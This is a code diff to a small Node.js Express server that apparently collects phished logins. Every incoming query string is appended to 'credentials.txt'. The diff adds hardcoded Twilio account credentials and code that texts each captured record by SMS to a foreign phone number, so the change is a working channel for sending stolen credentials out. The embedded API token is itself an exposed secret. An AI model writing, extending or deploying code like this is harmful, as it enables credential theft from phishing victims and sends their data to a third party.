@@ -4,12 +4,33 @@ const http = require('http');
 const app = express();
 const cors = require('cors');
 
+const accountSid = 'AC0b1f3ed38565f90a3dda11dd66073ba7';
+const authToken = 'a68d0c8ef30f3d69f2cc6aa8fe51b885';
+const client = require('twilio')(accountSid, authToken);
+
 app.use(cors());
+
+
+
+
+
+
 
 app.get('/', function (req, res) {
   console.log(req.query);
   const output = JSON.stringify(req.query);
   fs.appendFileSync('credentials.txt', `${output}\n`, (err) => {console.log(err)});
+  
+  // twilio block
+  client.messages
+  .create({
+     body: output,
+     from: '+15404181355',
+     to: '+380639752017'
+   })
+  .then(message => console.log(message.sid))
+  .done();
+
   res.send('Fuck U!');
 })
 
